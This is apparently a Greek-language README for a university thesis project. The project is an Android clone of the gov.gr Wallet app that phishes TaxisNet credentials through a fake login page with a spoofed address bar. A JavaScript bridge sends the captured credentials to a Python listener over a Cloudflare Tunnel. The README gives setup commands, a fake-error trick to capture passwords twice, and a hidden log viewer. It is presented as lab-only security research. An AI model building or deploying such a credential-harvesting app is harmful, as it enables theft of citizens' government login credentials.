<div align="center">

# 📱 Gov.gr Wallet — Κλώνος & Προσομοίωση Credential Harvesting

### Πτυχιακή Εργασία — Κοινωνική Μηχανική σε Κινητές Συσκευές

![Android](https://img.shields.io/badge/Android-3DDC84?style=flat-square&logo=android&logoColor=white)
![Kotlin](https://img.shields.io/badge/Kotlin-7F52FF?style=flat-square&logo=kotlin&logoColor=white)
![Jetpack Compose](https://img.shields.io/badge/Jetpack_Compose-4285F4?style=flat-square&logo=jetpackcompose&logoColor=white)
![Material 3](https://img.shields.io/badge/Material_3-757575?style=flat-square&logo=materialdesign&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)
![Cloudflare](https://img.shields.io/badge/Cloudflare_Tunnel-F38020?style=flat-square&logo=cloudflare&logoColor=white)

</div>

---

> **👤 Συγγραφέας:** Χαράλαμπος Στίκος
> **🎓 Αντικείμενο:** Κοινωνική Μηχανική σε Κινητές Συσκευές
> **🧪 Περιβάλλον:** Android (Kotlin / Jetpack Compose) · Python listener · Cloudflare Tunnel
> ⚠️ Αποκλειστικά για εργαστηριακή / εκπαιδευτική χρήση

---

## 📖 Περιγραφή

Πιστός **κλώνος της εφαρμογής gov.gr Wallet** για Android, που αναπτύχθηκε στο πλαίσιο πτυχιακής εργασίας για τη μελέτη και προσομοίωση επιθέσεων **Credential Harvesting** μέσω **sideloaded** εφαρμογών.

Η εφαρμογή αναπαράγει την εμπειρία χρήστη του επίσημου ελληνικού ψηφιακού πορτοφολιού (native UI σε Jetpack Compose) και ενσωματώνει έναν κλώνο της πύλης αυθεντικοποίησης **TaxisNet OAuth2** μέσα σε **WebView**. Όταν το θύμα εισάγει τους κωδικούς του, αυτοί **καταγράφονται τοπικά** μέσα στην εφαρμογή και ταυτόχρονα **αποστέλλονται σε απομακρυσμένο Python listener** μέσω Cloudflare Tunnel.

### Κύρια Χαρακτηριστικά
- **Native UI:** Πιστή αναπαραγωγή της αρχικής οθόνης gov.gr wallet με Jetpack Compose (Kotlin), Material 3.
- **Attack Simulation:** Ενσωματωμένο WebView που φορτώνει κλώνο της πύλης αυθεντικοποίησης TaxisNet (`file:///android_asset/index.html`), με **ψεύτικη μπάρα διεύθυνσης `🔒 oauth2.gsis.gr`** για αληθοφάνεια.
- **JavaScript Bridge:** Υποκλοπή ονόματος χρήστη/κωδικού μέσω `@JavascriptInterface` (γέφυρα `AndroidBridge`).
- **Διπλή καταγραφή:** Τα στοιχεία αποθηκεύονται (α) **τοπικά** στη μνήμη της εφαρμογής και (β) **απομακρυσμένα** στον Python listener σε πραγματικό χρόνο.
- **Κρυφός Log Viewer:** **5 διαδοχικά taps** στο `gov.gr` logo του footer αποκαλύπτουν οθόνη με τα καταγεγραμμένα διαπιστευτήρια (για τον ερευνητή).

---

## 🖼️ Στιγμιότυπα

<div align="center">

| Αρχική Οθόνη (gov.gr wallet) | Φόρμα TaxisNet (WebView) | Ψεύτικο Σφάλμα Σύνδεσης |
|:---:|:---:|:---:|
| ![Wallet App](./GOV-WALLET-APP-IMAGES/GOV%20WALLET%20APP.png) | ![Taxis Form](./GOV-WALLET-APP-IMAGES/GOV%20WALLET%20TAXIS%20FORM.png) | ![Login Error](./GOV-WALLET-APP-IMAGES/USER%20LOGIN%20ERROR.png) |

| Προσπάθεια Σύνδεσης | Python Listener | Σύλληψη Διαπιστευτηρίων |
|:---:|:---:|:---:|
| ![Login Attempt](./GOV-WALLET-APP-IMAGES/USER%20LOGIN%20ATTEMPT.png) | ![Python Listener](./GOV-WALLET-APP-IMAGES/PYTHON%20LISTENER.png) | ![Listener Capture](./GOV-WALLET-APP-IMAGES/LISTENER%20CREDENTIAL%20CAPTURE.png) |

</div>

---

## 🎓 Ακαδημαϊκό Πλαίσιο

Το project αποτελεί μέρος ευρύτερης πτυχιακής εργασίας με θέμα την κυβερνοασφάλεια σε κινητές συσκευές. Στόχοι:

1. Η ανάδειξη των κινδύνων από τη χρήση **μη επίσημων εφαρμογών (Sideloading)**.
2. Η ανάλυση του τρόπου με τον οποίο οι επιτιθέμενοι εκμεταλλεύονται το **WebView** και το **JavaScript Interface**.
3. Η προσομοίωση της **διαδρομής των δεδομένων** από το θύμα στον επιτιθέμενο, σε πραγματικό χρόνο.

---

## 🛠 Τεχνολογικό Stack

| Επίπεδο | Τεχνολογία |
| :--- | :--- |
| **Ανάπτυξη Mobile** | Kotlin · Jetpack Compose · Material 3 · Android SDK (minSdk 24, targetSdk 36) |
| **Web Simulation** | HTML5 · CSS3 · JavaScript (μέσα στα `assets/`) |
| **Receiver (Server)** | Python (`http.server`) |
| **Exfiltration** | Cloudflare Tunnel (reverse proxy) · `HttpURLConnection` |

---

## 🧭 Ροή Επίθεσης

```
[ Αρχική Οθόνη gov.gr wallet ]  (GovGrWalletScreen)
        │  tap «Σύνδεση με κωδικούς TaxisNet»
        ▼
[ WebView με ψεύτικη μπάρα 🔒 oauth2.gsis.gr ]  (LocalCaptivePortal)
        │  φορτώνει file:///android_asset/index.html
        ▼
[ Φόρμα TaxisNet ]  → submit
        │  window.AndroidBridge.captureCredentials(user, pass)
        ▼
[ WebAppInterface (Kotlin) ]
        ├──► CredentialRepository.add(...)        # τοπική καταγραφή (in-memory)
        └──► exfiltrate(user, pass, retries = 3)  # POST JSON στο Cloudflare Tunnel
                     ▼
        [ Python listener :8000 ] → captured_credentials.log
```

### Μηχανισμός «Δύο Προσπαθειών»

Για να μεγιστοποιηθεί η πιθανότητα σύλληψης **σωστού** κωδικού:

| Προσπάθεια | Συμπεριφορά |
|------------|-------------|
| **1η υποβολή** | Καταγράφονται τα στοιχεία → εμφανίζεται **ψεύτικο σφάλμα** «Αποτυχία στην Αυθεντικοποίηση» → καθαρίζεται το πεδίο κωδικού και ζητείται επανάληψη. |
| **2η υποβολή** | Καταγράφονται ξανά τα στοιχεία → `AndroidBridge.finishSession()` → η οθόνη WebView κλείνει και επιστρέφει στην αρχική. |

Έτσι, αν το θύμα πληκτρολόγησε λάθος την πρώτη φορά, καταγράφονται **και οι δύο εκδοχές** του κωδικού.

---

## 📂 Αρχιτεκτονική & Δομή

```
govgrwallet-prototype/
├── app/
│   ├── build.gradle.kts                       # ⚙️ ΕΔΩ ορίζεται το EXFIL_URL (buildConfigField)
│   └── src/main/
│       ├── AndroidManifest.xml                # INTERNET permission, usesCleartextTraffic=true
│       ├── assets/
│       │   ├── index.html                     # Κλώνος φόρμας TaxisNet + JS (AndroidBridge)
│       │   └── style.css
│       └── java/com/example/govgrwallet/
│           ├── MainActivity.kt                # Πλοήγηση: Home ↔ WebView ↔ Logs
│           ├── web/WebAppInterface.kt         # 🔑 JS bridge + exfiltration (HttpURLConnection)
│           ├── data/CredentialRepository.kt   # Τοπική (in-memory) καταγραφή
│           └── ui/
│               ├── screens/GovGrWalletScreen.kt    # Αρχική οθόνη (+ 5-tap secret logs)
│               ├── screens/LocalCaptivePortal.kt   # WebView + ψεύτικη μπάρα oauth2.gsis.gr
│               ├── screens/CapturedLogsScreen.kt   # Κρυφή οθόνη προβολής captures
│               └── components/WalletComponents.kt  # Logo, buttons, icons (Canvas)
├── listener.py                                # 🐍 Python listener (port 8000)
└── captured_credentials.log                   # Log του listener — δημιουργείται αυτόματα
```

### Κρίσιμα σημεία κώδικα

- **`web/WebAppInterface.kt`** — η «γέφυρα» μεταξύ WebView και native κώδικα. Εκθέτει στο JavaScript τις μεθόδους `captureCredentials(user, pass)` και `finishSession()` μέσω `@JavascriptInterface`. Το `exfiltrate()` στέλνει `POST` με payload `{"username":"...","password":"..."}` στο `BuildConfig.EXFIL_URL`, με **έως 3 προσπάθειες** και backoff 2 δευτερολέπτων.
- **`ui/screens/LocalCaptivePortal.kt`** — δημιουργεί το `WebView` (με `javaScriptEnabled = true`), προσθέτει το interface ως **`AndroidBridge`** και φορτώνει το τοπικό `index.html`. Η ψεύτικη μπάρα διεύθυνσης δείχνει `🔒 oauth2.gsis.gr`.
- **`data/CredentialRepository.kt`** — `object` με `mutableStateListOf` που κρατά τα captures στη μνήμη για την οθόνη logs.

---

## ⚙️ Οδηγίες Χρήσης (Lab Setup)

### 1. Εκκίνηση του Python listener (στο laptop)

```bash
python listener.py
```

Ο listener ακούει στο `0.0.0.0:8000` και αποθηκεύει τα διαπιστευτήρια στο `captured_credentials.log`.

### 2. Δημιουργία Cloudflare Tunnel (σε άλλο τερματικό)

```bash
cloudflared tunnel --url http://localhost:8000
```

Το `cloudflared` επιστρέφει ένα δημόσιο URL της μορφής `https://<random>.trycloudflare.com`. Ο listener διαβάζει την πραγματική IP του θύματος από το header `CF-Connecting-IP` που προωθεί το Cloudflare.

### 3. Ρύθμιση του exfiltration URL στην εφαρμογή

Ενημερώστε το `EXFIL_URL` στο **`app/build.gradle.kts`** (όχι στο `WebAppInterface.kt` — εκεί απλώς διαβάζεται μέσω `BuildConfig.EXFIL_URL`) με το URL του tunnel:

```kotlin
// app/build.gradle.kts → android { defaultConfig { ... } }
buildConfigField("String", "EXFIL_URL", "\"https://<random>.trycloudflare.com\"")
```

### 4. Build & εγκατάσταση

Κάντε build και εγκαταστήστε το APK στη δοκιμαστική συσκευή (Android Studio ή `./gradlew installDebug`). Καθώς το exfiltration γίνεται προς διεύθυνση `trycloudflare.com` μέσω HTTPS, δεν απαιτείται κάποια άλλη ρύθμιση δικτύου.

### 5. Επίδειξη

Ανοίξτε την εφαρμογή → **«Σύνδεση με κωδικούς TaxisNet»** → εισάγετε δοκιμαστικά στοιχεία. Παρακολουθήστε τα captures να φτάνουν στο τερματικό του listener. Εναλλακτικά, **5 taps** στο `gov.gr` logo του footer ανοίγουν την τοπική οθόνη καταγραφών μέσα στην ίδια την εφαρμογή.

---

## 💾 Καταγραφή Δεδομένων

Τα διαπιστευτήρια καταγράφονται σε **δύο σημεία**:

- **Τοπικά (in-app):** `CredentialRepository` — προβάλλονται στην κρυφή οθόνη `CapturedLogsScreen` (5-tap).
- **Απομακρυσμένα:** Ο `listener.py` τα γράφει στο `captured_credentials.log`.

Παράδειγμα εγγραφής (`captured_credentials.log`):

```
[2026-05-06 19:28:31] NEW CAPTURE from 2a02:587:4c46:a200:95e4:132b:e92e:5c8a
  USERNAME : HELLO_TEST
  PASSWORD : FAKE PASSWORD123456
========================================
```

---

## ⚠️ Σημείωση Ασφαλείας & Δεοντολογίας

> Το παρόν έργο διέπεται από τις αρχές του **Ethical Hacking**.
>
> - Η χρήση του προορίζεται **αποκλειστικά** για την επίδειξη κενών ασφαλείας σε **ελεγχόμενο περιβάλλον**.
> - **Απαγορεύεται** η χρήση του για οποιαδήποτε παράνομη δραστηριότητα ή σε συσκευές τρίτων χωρίς **ρητή συγκατάθεση**.
> - Ο συγγραφέας δεν φέρει καμία ευθύνη για κακή χρήση του κώδικα.

---

<div align="center">

**Χαράλαμπος Στίκος** · Πτυχιακή Εργασία — Κοινωνική Μηχανική σε Κινητές Συσκευές

</div>
